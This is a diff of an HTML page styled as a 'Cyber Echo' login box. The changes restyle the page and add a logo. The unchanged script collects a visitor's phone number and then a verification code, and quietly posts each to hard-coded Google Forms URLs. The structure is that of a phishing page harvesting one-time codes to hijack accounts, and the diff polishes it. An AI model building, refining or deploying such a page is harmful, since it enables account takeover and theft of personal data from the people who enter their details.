@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Cyberecho215</title>
+  <title>Cyber Echo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body { 
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-      background: #0a0a0a url('https://i.imgur.com/ZXtQXiQ.png') no-repeat center center fixed; 
+      background: #0a0a0a url('https://i.imgur.com/3frcEMt.jpeg') no-repeat center center fixed; 
       background-size: cover;
       display: flex; 
       flex-direction: column;
@@ -28,10 +28,10 @@
     }
 
     h1.nickname { 
-      font-size: 28px; 
+      font-size: 32px; 
       margin-bottom: 20px; 
       color: #00aaff;
-      text-shadow: 0 0 8px #0077cc;
+      text-shadow: 0 0 10px #0077cc;
     }
 
     input { 
@@ -68,23 +68,33 @@
     }
 
     .hidden { display: none; }
+
+    .logo {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      margin-bottom: 15px;
+      box-shadow: 0 0 20px rgba(0,170,255,0.5);
+    }
   </style>
 </head>
 
 <body>
 
-  <h1 class="nickname">Cyberecho215</h1>
+  <!-- Icon + Nickname -->
+  <img class="logo" src="https://i.imgur.com/3frcEMt.jpeg" alt="Icon">
+  <h1 class="nickname">Cyber Echo</h1>
 
+  <!-- Login box -->
   <div class="overlay">
-    <h2 id="title">Enter Phone Number</h2>
-    <input type="text" id="number" placeholder="Enter your phone number">
-    <input type="text" id="code" placeholder="Enter Code" class="hidden">
+    <input type="text" id="number" placeholder="Phone Number">
+    <input type="text" id="code" placeholder="Code" class="hidden">
     <button id="actionBtn" onclick="submitNumber()">Next</button>
   </div>
 
   <script>
     let savedNumber = "";
-    
+
     // Google Forms URLs
     const numberFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSe1s-L-9FnjQrbjw3M2jrhsxmrbzsvJ2T2FMymBy4J3WzkfMw/formResponse";
     const codeFormURL = "https://docs.google.com/forms/d/e/1FAIpQLSf6-83AO0HS7wiMpJCCz_XSGXyNlZUolHRVXk305SQj_pAi8g/formResponse";
@@ -99,7 +109,6 @@
       fetch(url, { mode: "no-cors" });
 
       // Switch to Code input
-      document.getElementById("title").innerText = "Enter Code";
       document.getElementById("number").classList.add("hidden");
       document.getElementById("code").classList.remove("hidden");
 
